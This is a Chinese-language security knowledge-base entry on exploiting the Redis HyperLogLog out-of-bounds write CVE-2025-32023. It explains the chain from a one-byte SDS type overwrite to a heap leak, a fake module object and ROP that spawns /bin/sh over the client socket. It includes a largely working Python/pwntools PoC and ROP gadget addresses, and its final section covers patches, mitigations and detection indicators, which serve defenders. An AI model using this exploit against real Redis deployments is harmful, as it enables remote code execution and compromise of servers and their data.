---
id: binary-pwn-heap-redis-hll-sparse-oob-sds-type-fake-robj-module-rop
title: Redis HyperLogLog 稀疏编码越界写（CVE-2025-32023）：改相邻 SDS 类型伪造超长字符串泄堆，伪造 module robj 的 free 回调走 ROP
type: scenario
domain: binary
path: binary/pwn/heap
technique: redis-hll-sparse-oob-sds-type-confusion-fake-robj-module-free-rop
tags:
- redis
- cve-2025-32023
- hyperloglog
- hll
- oob-write
- sds
- heap-spray
- robj
- module
- rop
- rce
cve:
- CVE-2025-32023
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V191
  verified_at: '2026-11-06T22:41:02+08:00'
  notes: 已对照原文与18张图核对：CVE-2025-32023 sparse HLL越界写、val regval=4改SDS_TYPE_64、fakelen伪造、MSET embstr堆喷、fake OBJ_MODULE free回调ROP、dup2(fd)复接socket、SET触发释放，gadget与exp一致；修复版本8.2.1/8.0.3/7.4.5/7.2.10/6.2.19与公开公告一致；PoC未复跑
url: /docs/binary/pwn/heap/binary-pwn-heap-redis-hll-sparse-oob-sds-type-fake-robj-module-rop/
draft: false
kb_aliases:
- CVE-2025-32023
- Redis HLL 越界写
- HyperLogLog 稀疏编码
- PFMERGE RCE
- PFADD PFMERGE 堆溢出
- 改 SDS 类型 SDS_TYPE_64
- fake robj module free
- redis-server ROP
---

## 一句话结论

Redis 的 HyperLogLog 稀疏编码解析存在越界写（CVE-2025-32023）：构造一串特制 XZERO/VAL 操作码的 sparse HLL，使 `PFMERGE` 触发的 `hllSparseToDense` 在相邻 SDS 字符串的 `type` 字节上写入 1 字节，把 SDS_TYPE_8 改成 SDS_TYPE_64；随后 `sdslen` 读取预先布置在头部的伪造成 8 字节长度，得到一个约 1MB 的超长字符串用于 `GETRANGE` 转储堆。从堆转储中定位堆喷的 embstr 对象，覆盖其 robj 为 `OBJ_MODULE` 并伪造 moduleType 的 `free` 回调与 ROP 链，最后用 `SET <key> 0` 释放该假对象触发 `free`，经 `dup2` 把 shell 接到 Redis 连接上。

## 原理

- **HLL 的存储格式**：Redis 的 HyperLogLog 就是一个带 `HYLL` 头的 sds 字符串，第 5 字节为编码（0=dense、1=sparse）。sparse 编码由 ZERO/XZERO/VAL 三类操作码组成，用变长 run length 表示连续寄存器为 0 的区间；解析器按这些 run length 前后移动写指针，并假定累加结果始终落在 HLL 缓冲区内部。
- **越界写的成因**：解析器信任稀疏操作码的 run length 累加，没有对写指针做严格边界检查。精心排列的 `XZERO`（每条约 0x4000 寄存器）可以让写指针在寄存器索引空间中“借位”回绕，最终指向 HLL 缓冲区之前的地址；最后一个 `VAL` 操作码的 `regval` 字节于是写到 HLL 对象之外。
- **一次 OOB 写为什么足够**：利用者通过堆布局让 dense HLL 的 0x3010 分配（jemalloc 0x3800 size class）与一个 14KiB 的 `sds:b` 相邻，并控制 XZERO 序列使 OOB 的 1 字节正好落在 `sds:b` 的 SDS flags/type 字节上。写入值 4 对应 `SDS_TYPE_64`，把原本的 `SDS_TYPE_8` 类型标记改掉。
- **类型改变导致长度字段错位读取**：`sdslen()` 先读 `s[-1]` 的 flags 判断头部类型，再按该类型读取 len。类型从 8 位变成 64 位后，Redis 会把 `sds:b` 数据区之前 8 字节当成 64 位 len。攻击者事先用 `SETRANGE` 在这些位置布置 `0x4142434445464748`，于是 `strlen(sds:b)` 返回一个巨大值，`GETRANGE sds:b 0 0x100000` 即可把相邻堆内存（包括堆喷对象）读回来。
- **堆喷与伪造 robj**：用 `MSET` 批量写入 0x2b 字节的 embstr 值（robj 0x10 + sdshdr8 0x3 + 数据 0x2b = 0x40 分配），内容为随机 marker + 序号。转储中按 marker 找到合法 embstr，校验 robj 的 encoding/refcount 与 sdshdr8 的 `0x2b 0x2b 0x01`，即可由 robj 的 `ptr` 反推 robj 地址并取出对应 key。
- **假 module 对象与 free 回调**：把该 embstr 的 robj 覆盖为 `type=OBJ_MODULE(5)`、`refcount=1`、`ptr` 指向伪造的 module value；fake moduleType 里把 `free` 指到 pivot gadget（`mov rax,rdi; mov rsi,[rdi+8]; mov rdi,[rdi]; mov rbp,rsp; call [rax+0x10]`），module value 的 `value` 字段指向 ROP 链。`SET <key> 0` 覆盖原值时释放旧 robj，Redis 认为它是 module 对象，调用 `moduleType->free`，控制流进入 gadget/ROP。
- **ROP 收割**：ROP 用 `dup2(fd,0)`、`dup2(fd,1)`、`dup2(fd,2)` 把当前 Redis 客户端 socket 复制成标准输入输出，再 `execve("/bin/sh", ["/bin/sh"], NULL)`；由于 fd 来自 `CLIENT INFO` 的 `fd=`，交互 shell 直接回到攻击者的原始连接。
- **为什么最终能 RCE**：整条链把“稀疏编码的越界写 1 字节”升级为“相邻对象类型混淆 → 超大堆读 → 假对象间接调用”，最终控制 `moduleType->free` 的函数指针并用 ROP 调 `execve`，属于完整的远程代码执行，不是仅崩溃。

## 触发条件

- 目标 Redis 存在 CVE-2025-32023；官方修复版本为 8.2.1、8.0.3、7.4.5、7.2.10、6.2.19（具体以官方安全公告为准）。
- 攻击者能向 Redis 发送任意命令（未授权暴露，或已通过认证/拿到口令）；至少能执行 `SET`/`SETRANGE`/`GETRANGE`/`MSET`/`PFADD`/`PFMERGE`。
- 能保持一个原始 socket 连接并用 `CLIENT INFO` 读取该连接的 `fd`，用于最后的 `dup2`。
- 目标构建的 jemalloc size class、结构体偏移与 redis-server 二进制匹配；原文从 Docker 镜像中复制出 `redis-server` 以便用符号计算 gadget/偏移；非官方构建需要重新校准。
- 堆布局可稳定预测（HLL 分配、SDS 预置、embstr 堆喷），否则需要按 `GETRANGE` 转储结果动态调整。

## 利用步骤

1. 取得目标 `redis-server` 二进制（原文从容器内复制），用 `checksec`/符号表确认 PIE 与 gadget、jemalloc extent hooks 等偏移。
2. 建立原始 socket 连接 `p`，发送 `client info`，从 `fd=` 解析当前连接 fd。
3. 用 redis-py 的 `SET` 写入一个合法 dense HLL：`b'HYLL' + p8(0)` 后补零到 0x3010，`PFADD` 验证编码合法。
4. 构造 malformed sparse HLL：`HYLL` + `p8(1)` + 3 字节 + 8 字节，再拼接大量 `XZERO(0x4000)`、`XZERO(0xc000-0x956c)`、一个 `VAL(runlen=1, regval=4)`、`XZERO(0x156b)` 和 3 个 `XZERO(0x4000)`，使写指针回绕并在 `sds:b` 的 type 字节写入 4（SDS_TYPE_64）。
5. 预先用 `SETRANGE` 布置 `sds:a`/`sds:b`/`sds:c` 三个 14KiB 字符串，在 `sds:b` 数据区之前的 8 字节写入伪长度 `0x4142434445464748`。
6. 执行 `PFMERGE hll:exp hll:dense` 触发 `hllMerge` + `hllSparseToDense`；断言 `strlen(sds:b) == 0x4142434445464748`，确认类型混淆成功。
7. 用 `MSET` 批量堆喷 embstr（marker + `p64(idx)`，`ljust(0x2b, b' ')`），每批 0x400 个，共约 0x4000 个 key。
8. `GETRANGE sds:b 0 0x100000` 转储堆，按 marker 找到合法 embstr，校验 `dump[tofs] == 0x80`、`refcount == 1`、`sdshdr8 == b'\x2b\x2b\x01'`，计算 robj 地址与 `sds:_{idx}` key。
9. 在转储中扫描 jemalloc extent hooks 特征（`0x200000` 与低 12 位等于 `je_ehooks_default_extent_hooks`）求 redis-server PIE 基址。
10. 覆盖目标 embstr 的 robj：`type=5`、`refcount=1`、`ptr` 指向 fake module value；布置 fake moduleType 的 `free` gadget、`/bin/sh` 字符串和 ROP 链（`dup2(fd,0/1/2)` + `execve`）。
11. 关闭 redis-py 连接，保留原始 socket；发送 `set <tkey> 0` 覆盖该 key 并释放旧值，触发 fake module 的 `free`，ROP 执行后 `p.interactive()` 拿 shell，读 flag。

## PoC

原文 exp 的核心片段（地址/偏移按目标二进制与 libc/分配器校准）：

```python
from pwn import *
import redis

r = redis.Redis(HOST, PORT)
p = remote(HOST, PORT)
p.sendline('client info'); p.recvuntil('fd=')
fd = int(p.recvline().split()[0])

HLL_DENSE, HLL_SPARSE, HLL_DENSE_SIZE = 0, 1, 0x3010

# 合法 dense HLL
pl = b'HYLL' + p8(HLL_DENSE)
pl = pl.ljust(HLL_DENSE_SIZE, p8(0))
r.set('hll:dense', pl); r.pfadd('hll:dense')

# malformed sparse HLL
def xzero(sz):
    sz -= 1
    return p8(0b01000000 | (sz >> 8)) + p8(sz & 0xff)

pl = b'HYLL' + p8(HLL_SPARSE) + p8(0) * 3 + p8(0) * 8
pl += xzero(0x4000) * 0x3fffd          # 写指针回绕
pl += xzero(0xc000 - 0x956c)
pl += p8(0b10001100)                   # runlen=1, regval=4 = SDS_TYPE_64
pl += xzero(0x156b)
pl += xzero(0x4000) * 3
r.set('hll:exp', pl)

# 伪造 64 位 SDS 长度
fakelen = 0x4142434445464748
r.setrange('sds:a', 0x37fa - 11, p64(fakelen))
r.setrange('sds:b', 0x37fa - 8, b'B' * 8)
r.setrange('sds:c', 0x37fa - 8, b'C' * 8)

# 触发 hllSparseToDense 的 OOB 写
r.pfmerge('hll:exp', 'hll:dense')
assert r.strlen('sds:b') == fakelen

# 堆喷 embstr，GETRANGE 转储，egghunt 后伪造 module robj
# ... 见利用步骤 7-10 ...

# 触发 module free
p.sendline(f'set {tkey} 0')
p.interactive()
```

gadget 参考（原文从 redis-server 提取）：

```text
0x001b9991: mov rax, rdi; mov rsi, [rdi+8]; mov rdi, [rdi]; mov rbp, rsp; call qword ptr [rax+0x10];
0x00226097: mov rbp, rdi; mov esi, 0x10; mov edi, 1; call qword ptr [rax+8];
0x001410ec: leave; ret;
0x002d6706: pop rdi; ret;
0x002d5cfb: pop rsi; ret;
0x000fc472: pop rdx; ret;
```

## 变体与关联

- 变体：不依赖 module 对象，可改用其它带函数指针的 Redis 对象/结构（如 `dictType`、`type->free`、`streamNACK` 等）把间接调用导向 gadget。
- 变体：HLL 的 1 字节 OOB 写也可用于改相邻对象的 refcount/encoding/长度字段，制造其它类型混淆或越界读；关键在于堆布局与写入偏移的精确控制。
- 关联：[[binary-pwn-heap-redis-stream-nack-double-free-rce]]（另一条 Redis 堆利用 RCE）、[[binary-pwn-sandbox-escape-redis-lua-package-loadlib-cve-2022-0543]]（Redis Lua 沙箱逃逸）、[[pentest-privilege-escalation-redis-module-load-root-exec]]（拿到 Redis 后的模块加载提权）、[[ctf-pwn-vaultcache-redis-module-rdb-off-by-8-sds-oob]]（CTF 中的 Redis SDS 越界读）。
- 边界：修复版本、HLL 命令被禁用/重命名、无法执行 `PFMERGE`、堆布局不稳定或二进制偏移不匹配时，该链不成立。

## 检测与防御

- **修复**：升级到 Redis 8.2.1、8.0.3、7.4.5、7.2.10、6.2.19 或更高版本；关注 CVE-2025-32023 的官方公告与发行版补丁。
- **缓解**：不需要 HLL 时用 ACL/`rename-command` 禁用 `PFADD`、`PFMERGE`、`PFCOUNT` 等命令；限制 Redis 只监听内网并强制认证；不要以 root 运行 redis-server；用容器/最小权限隔离。
- **检测**：出现大量 `XZERO` 连续操作码的 HLL 字符串、异常巨大的稀疏 HLL（远超正常 12KB 上限）、`PFMERGE` 后字符串类型/长度异常、`GETRANGE` 读取约 1MB 堆内容、`MSET` 批量写入 0x40 对齐的 marker 字符串、同一连接先 `CLIENT INFO` 再触发 `SET` 释放 module 对象等行为。
- **响应**：怀疑被利用时检查 Redis 进程是否派生 shell、是否有异常 `dup2`/`execve` 行为；立即升级、轮换凭据并审计数据完整性。
